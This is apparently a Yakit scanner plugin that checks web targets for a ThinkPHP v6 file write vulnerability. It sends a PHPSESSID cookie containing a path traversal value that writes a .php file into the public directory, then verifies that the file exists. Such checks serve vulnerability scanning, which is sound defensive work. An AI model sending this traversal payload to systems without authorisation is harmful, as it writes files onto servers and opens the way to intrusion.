yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="thinkphp v6 file write 漏洞"
    severity="high"
    type="thinkphp v6 file write 漏洞"
    f1 = 847000882

    poc_url_r0= url + `/`+ parseStr(f1) +`.php`
    req_r0, _ := http.NewRequest("GET",poc_url_r0,
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r0)
    resp_r0, _ := http.Do(req_r0)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 404{
        r0_flag = true
    }

    poc_url_r1= url + `/`
    req_r1, _ := http.NewRequest("GET",poc_url_r1,
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Cookie`,`PHPSESSID=../../../../public/`+ parseStr(f1) +`.php`),)
    breq,_=http.dump(req_r1)
    resp_r1, _ := http.Do(req_r1)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && ("set-cookie" in resp_r1.Header) && str.Contains(string(header),parseStr(f1)){
        r1_flag = true
    }

    poc_url_r2= url + `/`+ parseStr(f1) +`.php`
    req_r2, _ := http.NewRequest("GET",poc_url_r2,
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r2)
    resp_r2, _ := http.Do(req_r2)
    bresp,_=http.dump(resp_r2)
    header, body = poc.Split(bresp)
    r2_flag = false
    if resp_r2.StatusCode == 200 && str.Contains(string(header),"text/html"){
        r2_flag = true
    }

    poc_url=poc_url_r2
    if r0_flag && r1_flag && r2_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v", type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("%v", type)),
                risk.titleVerbose(sprintf("%v", reference)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
